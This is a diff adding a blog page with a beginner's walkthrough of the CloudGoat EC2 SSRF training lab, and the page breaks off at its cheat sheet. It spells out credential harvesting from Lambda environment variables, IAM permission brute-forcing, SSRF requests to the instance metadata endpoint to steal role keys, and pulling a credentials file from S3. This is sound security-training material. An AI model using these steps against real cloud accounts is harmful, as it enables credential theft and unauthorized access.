@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<link rel="apple-touch-icon" sizes="180x180" href="../../favicon/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="../../favicon/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="../../favicon/favicon-16x16.png">
+<link rel="manifest" href="../../favicon/site.webmanifest">
+<link rel="mask-icon" href="../../favicon/safari-pinned-tab.svg" color="#5bbad5">
+<meta name="msapplication-TileColor" content="#da532c">
+<meta name="theme-color" content="#ffffff">
+<title itemprop="name"> Cloudgoat EC2 SSRF Walkthrough | Personal Portfolio 
+</title>
+<meta name="description" content="A biomedical engineering student and cybersecurity enthusiast" />
+<meta property="og:title" content="Cloudgoat EC2 SSRF Walkthrough | Personal Portfolio" />
+<meta name="twitter:title" content="Cloudgoat EC2 SSRF Walkthrough | Personal Portfolio" />
+<meta itemprop="name" content="Cloudgoat EC2 SSRF Walkthrough | Personal Portfolio" />
+<meta name="application-name" content="Cloudgoat EC2 SSRF Walkthrough | Personal Portfolio" />
+<meta property="og:description"
+      content="A biomedical engineering student and cybersecurity enthusiast" />
+<meta property="og:site_name" content="Personal Portfolio" />
+<meta property="og:url" content="http://localhost:1313/posts/ec2_ssrf_walkthrough/" />
+<meta property="og:locale" content="en">
+<meta property="og:image" content="/assets/images/posts/ec2_ssrf_cloudgoat_challenge_logo.png" />
+<meta property="og:image:secure_url" content="http://localhost:1313/assets/images/posts/ec2_ssrf_cloudgoat_challenge_logo.png" />
+<meta property="og:type" content="article" />
+
+<script>
+    
+    if (localStorage.getItem('color-theme') === 'dark' || (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+        document.documentElement.classList.add('dark');
+    } else {
+        document.documentElement.classList.remove('dark')
+    }
+</script>
+
+
+
+
+<link rel="stylesheet" href="/css/style.min.0a202f217b79b733be0a4bee09017a95c0ee1defd72592123773a706d3fe0e1f.css" integrity="sha256-CiAvIXt5tzO+CkvuCQF6lcDuHe/XJZISN3OnBtP+Dh8=" />
+
+</head>
+
+<body class="bg-zinc-100 dark:bg-gray-800">
+    <div class="top-0 z-50 w-full text-gray-200 bg-gray-900 border-2 border-gray-900 md:sticky border-b-stone-200/10">
+    <div x-data="{ open: false }" class="flex flex-col max-w-full px-4 mx-auto md:items-center md:justify-between md:flex-row md:px-6 lg:px-8">
+        <div class="flex flex-row items-center justify-between p-4">
+            <a href="../../" class="flex text-gray-100 transition duration-1000 ease-in-out group">
+                <img src="../../images/cyber-immuno-fusion.png" class="transition-opacity h-9 w-9 group-hover:opacity-50 group-focus:opacity-70" alt="Personal Portfolio Logo" />
+                <div class="mt-1 ml-3 text-xl font-black tracking-tight text-gray-100 uppercase transition-colors group-hover:text-gray-400/60">
+                    Personal Portfolio</div>
+            </a>
+            <button class="rounded-lg md:hidden focus:outline-none focus:shadow-outline" @click="open = !open" role="navigation" aria-expanded="false" aria-label="Main" aria-controls="menuItems">
+                <svg fill="currentColor" viewBox="0 0 20 20" class="w-6 h-6">
+                    <path x-show="!open" fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM9 15a1 1 0 011-1h6a1 1 0 110 2h-6a1 1 0 01-1-1z" clip-rule="evenodd"></path>
+                    <path x-show="open" fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+                </svg>
+            </button>
+        </div>
+        <nav :class="{'flex': open, 'hidden': !open}" class="flex-col flex-grow hidden pb-4 md:pb-0 md:flex md:justify-end md:flex-row">
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/" title="Home">
+                Home
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/about/" title="About">
+                About
+            </a>
+            
+            
+            
+            <a class="px-4 py-2 mt-2 text-sm font-semibold rounded-lg md:mt-0 md:ml-4 hover:text-white focus:text-white hover:bg-primary-600 focus:bg-primary-700 focus:outline-none focus:shadow-outline" href="http://localhost:1313/posts/" title="Posts">
+                Posts
+            </a>
+            
+            
+            
+            <button id="theme-toggle" type="button" class="p-2 text-sm text-gray-500 rounded-lg md: dark:text-gray-400 md:hover:bg-gray-100 dark:md:hover:bg-gray-700 md:focus:outline-none md:focus:ring-4 md:focus:ring-gray-200 dark:md:focus:ring-gray-700 md:ml-2 xs:hidden">
+                <svg id="theme-toggle-dark-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M17.293 13.293A8 8 0 016.707 2.707a8.001 8.001 0 1010.586 10.586z">
+                    </path>
+                </svg>
+                <svg id="theme-toggle-light-icon" class="hidden w-5 h-5" fill="currentColor" viewBox="0 0 20 20" aria-label="Dark or Light Mode" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M10 2a1 1 0 011 1v1a1 1 0 11-2 0V3a1 1 0 011-1zm4 8a4 4 0 11-8 0 4 4 0 018 0zm-.464 4.95l.707.707a1 1 0 001.414-1.414l-.707-.707a1 1 0 00-1.414 1.414zm2.12-10.607a1 1 0 010 1.414l-.706.707a1 1 0 11-1.414-1.414l.707-.707a1 1 0 011.414 0zM17 11a1 1 0 100-2h-1a1 1 0 100 2h1zm-7 4a1 1 0 011 1v1a1 1 0 11-2 0v-1a1 1 0 011-1zM5.05 6.464A1 1 0 106.465 5.05l-.708-.707a1 1 0 00-1.414 1.414l.707.707zm1.414 8.486l-.707.707a1 1 0 01-1.414-1.414l.707-.707a1 1 0 011.414 1.414zM4 11a1 1 0 100-2H3a1 1 0 000 2h1z" fill-rule="evenodd" clip-rule="evenodd"></path>
+                </svg>
+            </button>
+            
+        </nav>
+    </div>
+</div>
+    
+<article>
+  <header class="mb-4 bg-primary-600">
+    <span class="py-96">
+      <h1 class="py-16 text-5xl font-black text-center text-white capitalize">
+        Cloudgoat EC2 SSRF Walkthrough
+      </h1>
+    </span>
+  </header>
+  <div class="max-w-4xl mx-auto mt-8 mb-2">
+    <div class="px-6">
+      
+      
+      
+      
+      
+      
+      <img src="../../../assets/images/posts/ec2_ssrf_cloudgoat_challenge_logo_hu_b31c7a1ef0d024ed.webp" srcset=", /../assets/images/posts/ec2_ssrf_cloudgoat_challenge_logo_hu_ef66fd2c6647b65b.webp 400w, /../assets/images/posts/ec2_ssrf_cloudgoat_challenge_logo_hu_7f401535ca4bd90b.webp 550w, /../assets/images/posts/ec2_ssrf_cloudgoat_challenge_logo_hu_6fe0651665365c2e.webp 768w, /../assets/images/posts/ec2_ssrf_cloudgoat_challenge_logo_hu_b31c7a1ef0d024ed.webp 1100w"
+           class="object-fill overflow-hidden rounded-lg shadow-lg ring-4 ring-zinc-300/40 dark:ring-gray-900/40 shadow-neutral-100/20 dark:shadow-neutral-800/40"
+           width="100%" alt="" />
+      
+      
+    </div>
+  </div>
+  
+  <div class="max-w-2xl px-6 pt-6 pb-16 mx-auto prose dark:prose-invert dark:text-white">
+    <h1 id="introduction--context">Introduction &amp; Context</h1>
+<p>Hey guys! This is a walkthrough of the <a href="https://github.com/RhinoSecurityLabs/cloudgoat/blob/master/cloudgoat/scenarios/aws/ec2_ssrf/README.md">Cloudgoat EC2 SSRF</a> Medium Challenge. I completed this challenge as part of Tyler&rsquo;s <a href="https://academy.simplycyber.io/l/pdp/introduction-to-aws-pentesting">Intro to AWS Pentesting course</a>, so part of this I was guided through, part of it not (I&rsquo;ll clarify which parts were and weren&rsquo;t). I&rsquo;ll be walking through how I solved this challenge and give my reasoning for it. I&rsquo;m writing targeted as beginners, so I&rsquo;ll try and explain as much as possible. I&rsquo;d still consider myself a noob at this, so don&rsquo;t expect this to be the &ldquo;optimal&rdquo; solution, but it&rsquo;s the most logical one (at least for me).</p>
+<h1 id="setup-guided">Setup (Guided)</h1>
+<p>Only setup we need to do is to start the cloudgoat challenge if you haven&rsquo;t already with</p>
+<pre tabindex="0"><code>cloudgoat create ec2_ssrf
+</code></pre><p>Wait till it finishes and grab the keysk, it&rsquo;ll look something like</p>
+<pre tabindex="0"><code>cloudgoat_output_solus_access_key_id = KEY_VALUE
+cloudgoat_output_solus_secret_key = SECRET_KEY_VALUE
+</code></pre><p>Let&rsquo;s also set up an aws profile with those credentials quickly too with <code>aws configure --profile solus</code> (you can use any profile name, solus is just my choice). Copy paste the values and set the region to <code>us-east-1</code> (most cloudgoat things will be in that region, so defaulting to that is a good start).</p>
+<h1 id="enumerate-ourself--lambda-guided">Enumerate ourself &amp; lambda (Guided)</h1>
+<p>Step 1 is always to verify that our credentials actually work. Run <code>aws sts get-caller-identity --profile solus</code> and it should give back some information like</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;UserId&#34;</span>: <span style="color:#e6db74">&#34;AIDAVRUVQNVQ7IKNYNKIQ&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Account&#34;</span>: <span style="color:#e6db74">&#34;381491899745&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Arn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::381491899745:user/solus-cgidnr0hwro0sg&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Now, we&rsquo;re going to be targetting lambda functions, as per the challenge description, so let&rsquo;s try and check if there&rsquo;s anything we can find. Run <code>aws lambda list-functions --region us-east-1 --profile solus</code>. Now you could do this in <strong>pacu</strong> too and that would work, but it&rsquo;s just a quick check so manual doesn&rsquo;t take that much extra time. Note the region has to be specified here otherwise it would default to the standard one. Executing that should give you some useful information</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&#34;Functions&#34;</span>: [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;FunctionName&#34;</span>: <span style="color:#e6db74">&#34;cg-lambda-cgidnr0hwro0sg&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;FunctionArn&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:lambda:us-east-1:381491899745:function:cg-lambda-cgidnr0hwro0sg&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Runtime&#34;</span>: <span style="color:#e6db74">&#34;python3.11&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Role&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:iam::381491899745:role/cg-lambda-role-cgidnr0hwro0sg-service-role&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Handler&#34;</span>: <span style="color:#e6db74">&#34;lambda.handler&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;CodeSize&#34;</span>: <span style="color:#ae81ff">223</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Description&#34;</span>: <span style="color:#e6db74">&#34;Invoke this Lambda function for the win!&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Timeout&#34;</span>: <span style="color:#ae81ff">3</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;MemorySize&#34;</span>: <span style="color:#ae81ff">128</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;LastModified&#34;</span>: <span style="color:#e6db74">&#34;2025-05-17T20:53:56.750+0000&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;CodeSha256&#34;</span>: <span style="color:#e6db74">&#34;jtqUhalhT3taxuZdjeU99/yQTnWVdMQQQcQGhTRrsqI=&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;$LATEST&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Environment&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Variables&#34;</span>: {
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;EC2_ACCESS_KEY_ID&#34;</span>: <span style="color:#e6db74">&#34;KEY_VALUE_HERE&#34;</span>,
+</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&#34;EC2_SECRET_KEY_ID&#34;</span>: <span style="color:#e6db74">&#34;SECRET_KEY_VALUE_HERE&#34;</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;TracingConfig&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Mode&#34;</span>: <span style="color:#e6db74">&#34;PassThrough&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;RevisionId&#34;</span>: <span style="color:#e6db74">&#34;42a89c87-df84-4042-9f57-4db59b709d3d&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;PackageType&#34;</span>: <span style="color:#e6db74">&#34;Zip&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Architectures&#34;</span>: [
+</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;x86_64&#34;</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;EphemeralStorage&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;Size&#34;</span>: <span style="color:#ae81ff">512</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;SnapStart&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;ApplyOn&#34;</span>: <span style="color:#e6db74">&#34;None&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;OptimizationStatus&#34;</span>: <span style="color:#e6db74">&#34;Off&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;LoggingConfig&#34;</span>: {
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;LogFormat&#34;</span>: <span style="color:#e6db74">&#34;Text&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f92672">&#34;LogGroup&#34;</span>: <span style="color:#e6db74">&#34;/aws/lambda/cg-lambda-cgidnr0hwro0sg&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>This is a treasure trove of information we got here. Key information to note:</p>
+<ul>
+<li><strong>Function Name:</strong> cg-lambda-cgidnr0hwro0sg</li>
+<li><strong>Description:</strong> Invoke this Lambda function for the win!</li>
+<li><strong>Environment</strong>: EC2 Access Key &amp; Secret Access Key ID</li>
+</ul>
+<p>Those credentials for EC2 are what we need to go onto our next phase, EC2 Enumeration!</p>
+<h1 id="ec2-enumeration-unguided">EC2 Enumeration (Unguided)</h1>
+<p>As always, when we get new credentials set up a aws profile and check their validity.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws configure --profile solus_cred
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pass in the key values from earlier</span>
+</span></span><span style="display:flex;"><span>aws sts get-caller-identity --profile solus_cred
+</span></span></code></pre></div><p>Now we can do either pacu or manual enumeration here. I&rsquo;m going to do a bit of both here. We&rsquo;ll do the inital bulk search with pacu and then dive in for some details using a quick manual search.</p>
+<p>So let&rsquo;s first use pacu to see what this ec2 account can actually do.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pacu
+</span></span><span style="display:flex;"><span>import_keys solus_cred
+</span></span><span style="display:flex;"><span>run iam__enum_permissions
+</span></span></code></pre></div><p>And&hellip; We can&rsquo;t do that. We don&rsquo;t have permissions. Alright, let&rsquo;s try another module, the bruteforce one <code>run iam__bruteforce_permissions</code>. This one will take a while. There&rsquo;s more than a decent chance it will take a really long while. But you&rsquo;ll see pretty soon that most of the outputs that have the &ldquo;It worked!&rdquo; come up start with <code>ec2</code>. That&rsquo;s a pretty good sign that this account has permissions to play with <code>ec2</code>.</p>
+<p>So if we can do stuff with <code>ec2</code> we should be able to enumerate that. There&rsquo;s a pacu module just for that, <code>ec2__num</code>. Let&rsquo;s run that with <code>run ec2__enum</code>. Then grab the data using <code>data ec2</code> to view the large json output. The key information is here</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span><span style="color:#e6db74">&#34;PrivateIpAddresses&#34;</span><span style="color:#960050;background-color:#1e0010">:</span> [
+</span></span><span style="display:flex;"><span>          {
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Association&#34;</span>: {
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&#34;IpOwnerId&#34;</span>: <span style="color:#e6db74">&#34;amazon&#34;</span>,
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&#34;PublicDnsName&#34;</span>: <span style="color:#e6db74">&#34;ec2-3-228-5-64.compute-1.amazonaws.com&#34;</span>,
+</span></span><span style="display:flex;"><span>              <span style="color:#f92672">&#34;PublicIp&#34;</span>: <span style="color:#e6db74">&#34;3.228.5.64&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;Primary&#34;</span>: <span style="color:#66d9ef">true</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;PrivateDnsName&#34;</span>: <span style="color:#e6db74">&#34;ip-10-10-10-89.ec2.internal&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f92672">&#34;PrivateIpAddress&#34;</span>: <span style="color:#e6db74">&#34;10.10.10.89&#34;</span>
+</span></span><span style="display:flex;"><span>          }
+</span></span><span style="display:flex;"><span>        ]<span style="color:#960050;background-color:#1e0010">,</span>
+</span></span></code></pre></div><p>That there is the public ip address for our machine. But what does that mean? If you&rsquo;ve ever done a CTF before, think of it like the IP address you get at the start. It&rsquo;s the public IP address for the machine where you can target it. Note that there is also a section called Security Groups, with a name <code>cg-ec2-ssh-cgidnr0hwro0sg</code>. We&rsquo;ll look into this in the next step.</p>
+<p>Now for a bit of quick manual enumeration. Finding out what securit groups are running is going to be useful as it&rsquo;ll tell us what ports are open. Run <code>aws ec2 describe-security-groups --region us-east-1 --profile solus_cred</code> and you&rsquo;ll get a json response once more. Under <code>IpPermissions</code> you&rsquo;ll find that ports 80 and 22 are open.</p>
+<p>Port 80 is what typically is used for http and 22 is used for ssh. Now that is useful. That likely means there is a webserver being hosted at it&rsquo;s ip, <code>http://3.228.5.64</code>. We&rsquo;re not using https (that&rsquo;s port 443 if I remember correctly), so your browser might give a warning. In this case, it&rsquo;s a lab so it&rsquo;s safe but generally avoid http sites (as communication is not encrypted!)</p>
+<p>And enumeration of both the lambda &amp; ec2 is done! We found a lambda function that we need to figure a way of executing. We found a web server being hsoted on a public IP. Now the next step is to explore that web server.</p>
+<h1 id="exploring-the-website--abuse-ssrf-unguided">Exploring the website &amp; abuse SSRF (Unguided)</h1>
+<p>Now that I have an ip, I tried running dirsearch and rustscan (a faster version of nmap) to see if I could find anything useful for quick wins. Unfortunately not this time. So let&rsquo;s go straight and check the url <code>http://3.228.5.64</code></p>
+<p>The website will be pretty basic, only a couple lines telling us it&rsquo;s an SSRF demo and a claim that it wants the url to be useful. Now if you&rsquo;ve never heard of SSRF, that&rsquo;s totally fair. If you asked me an year ago, heck even a month ago, I&rsquo;d be blanking. But I&rsquo;ve grinded through TryHackMe and one of the rooms I did was <a href="https://tryhackme.com/room/ssrfhr">this one,</a> and it will teach you everything about how Server Side Request Forgery (SSRF) actullay works. Highly recommend you try it out.</p>
+<p>So if we take the hint provided, we can give a shot at a basic file search by going to the url <code>http://3.228.5.64?url=localhost/config</code>. And the response tells us we found it! Even though it says it could not find the file, that means the url is the search parameter. Now it&rsquo;s just a matter of finding where we need to look.</p>
+<p>And if we google SSRF forgery on EC2, we found that this is actually a really relevant attack! Just a couple months ago (at time of writing), there was an attack that used this same attack in real life. Isn&rsquo;t that awesome (and scary I suppose)? Check <a href="https://technijian.com/server-support/server-vulnerability-management/hackers-target-ssrf-bugs-in-ec2-hosted-sites-to-steal-aws-credentials/">this website</a> out for information on it.</p>
+<p>Now that website also gives us a url we can go to. This url is only accessible by that machine, so if we go to it directly it won&rsquo;t work. So we&rsquo;ll have our EC2 machine go to it and return what it finds.</p>
+<p><code>http://3.228.5.64?url=http://169.254.169.254/latest/meta-data/</code>. You&rsquo;ll find it says <code>cg-ec2-role-cgidnr0hwro0sg</code>.</p>
+<p>To get our chest, we can go to that file and it&rsquo;ll show us our gold (Access Keys!) You should go to <code>http://3.228.5.64?url=http://169.254.169.254/latest/meta-data/cg-ec2-role-cgidnr0hwro0sg</code></p>
+<p>The response should look smt like:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-json" data-lang="json"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Code&#34;</span> : <span style="color:#e6db74">&#34;Success&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;LastUpdated&#34;</span> : <span style="color:#e6db74">&#34;2025-05-17T22:34:22Z&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Type&#34;</span> : <span style="color:#e6db74">&#34;AWS-HMAC&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;AccessKeyId&#34;</span> : <span style="color:#e6db74">&#34;SomeAccessKey&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;SecretAccessKey&#34;</span> : <span style="color:#e6db74">&#34;SomeSecretKey&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&#34;Token&#34;</span> : <span style="color:#e6db74">&#34;SomeLongToken&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;,
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">  &#34;</span><span style="color:#960050;background-color:#1e0010">Expiration</span><span style="color:#e6db74">&#34; : &#34;</span><span style="color:#ae81ff">2025-05-18</span><span style="color:#960050;background-color:#1e0010">T</span><span style="color:#ae81ff">05</span>:<span style="color:#ae81ff">03</span>:<span style="color:#ae81ff">15</span><span style="color:#960050;background-color:#1e0010">Z&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h1 id="enumerate-againunguided">Enumerate again(Unguided)</h1>
+<p>So now we got some new credentials, let&rsquo;s make a new profile with it. Again configure a profile</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws configure --profile ec2_ssrf
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Pass in the key from earlier</span>
+</span></span><span style="display:flex;"><span>aws sts get-caller-identity --profile ec2_ssrf
+</span></span></code></pre></div><p>That last command shouldn&rsquo;t work. Why? I didn&rsquo;t know so I asked chatgpt. What we found was a role and a role is time limited. That means we need to give it the token. There&rsquo;s a few different ways of doing it. The easiest way for me was to run <code>aws configure set profile.ec2_ssrf.aws_session_token TOKEN_VALUE_HERE</code>. Now try executing the last command and you should get output!</p>
+<p>Let&rsquo;s enumerate the permissions of our current user using pacu:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pacu
+</span></span><span style="display:flex;"><span>import_keys ec2_ssrf
+</span></span><span style="display:flex;"><span>run iam__enum_permissions
+</span></span></code></pre></div><p>And again, permission denied. Time to brute force! Run <code>run iam__bruteforce_permissions</code>. All we&rsquo;re trying to do is figure out what this user can do. That first one does enumeration relatively quietly and quickly. The second one takes longer, which is why we&rsquo;re running it as a &ldquo;last resort&rdquo;. But when you do that you&rsquo;ll see we have a neat permission, we can interact with S3 buckets!</p>
+<h1 id="s3-bucket-attack-unguided">S3 Bucket Attack! (Unguided)</h1>
+<p>We&rsquo;re almost there, we just need to grab one more pair of credentials and then run the lambda function. To start off let&rsquo;s find the buckets by running <code>aws s3 ls --profile ec2_ssrf</code>. That&rsquo;ll give you a bucket like <code>cg-secret-s3-bucket-......</code>. That is probably something useful. Let&rsquo;s go into that bucket</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws s3 ls s3://cg-secret-s3-bucket-cgidnr0hwro0sg --profile ec2_ssrf
+</span></span></code></pre></div><p>There&rsquo;s a folder called <code>aws</code>. Let&rsquo;s check that out</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws s3 ls s3://cg-secret-s3-bucket-cgidnr0hwro0sg/aws/ --profile ec2_ssrf
+</span></span></code></pre></div><p>Note that when we&rsquo;re going into subdirectories, we need to append a final /. Not when we&rsquo;re looking at the parent bucket though. After running that we see a file called <code>credentials</code>. Let&rsquo;s copy that into our current directory</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws s3 cp s3://cg-secret-s3-bucket-cgidnr0hwro0sg/aws/credentials . --profile ec2_ssrf
+</span></span></code></pre></div><p>Run <code>cat credentials</code> and you&rsquo;ll grab our last bag of goodies for this challenge. Our final pair of keys!</p>
+<h1 id="invoke-the-lambda-for-the-win-unguided">Invoke the Lambda for the Win (Unguided)</h1>
+<p>Use those keys to configure a new profile, same commands as before.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws configure --profile admin
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Pass in the key from earlier</span>
+</span></span><span style="display:flex;"><span>aws sts get-caller-identity --profile admin
+</span></span></code></pre></div><p>That should verify your keys work. From the course cheat sheet, we have a template for invoking the lambda. So run</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>aws lambda invoke --function-name cg-lambda-cgidnr0hwro0sg output.json --profile admin
+</span></span></code></pre></div><p>Your function name should be from whatever you found earlier (likely different from mine). And with that, you&rsquo;ll have a file saved in your working directory. <code>cat output.json</code> and you win!</p>
+<p><em>Don&rsquo;t forget to run <code>cloudgot destroy ec2_ssrf</code> after you finish so you don&rsquo;t end up getting charged for leaving machines on!</em></p>
+<h1 id="closing-thoughts">Closing Thoughts</h1>
+<p>This was a really entertaining lab scenario. First we needed to find what the lambda function was and look into the environment variables to get some keys. Then we had to enumerate that account to find a hidden webserver. Then we launched an SSRF attack to grab the keys &amp; token for another role. Then use that to enumerate an S3 bucket to grab a final pair of credentials. And close it off by running that lambda function we found at the start. A full circle. I learned a lot from doing this lab, and hopefully this walkthrough helped get over whatever issues you faced.</p>
+<h1 id="cheat-sheet">Cheat Sheet</h1>
+<p>To close off, here&rsquo;s a quick summary of the key commands we needed to run to complete this module (not all, just the ones I would refer back to).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#Start Up &amp; self enumeration</span>
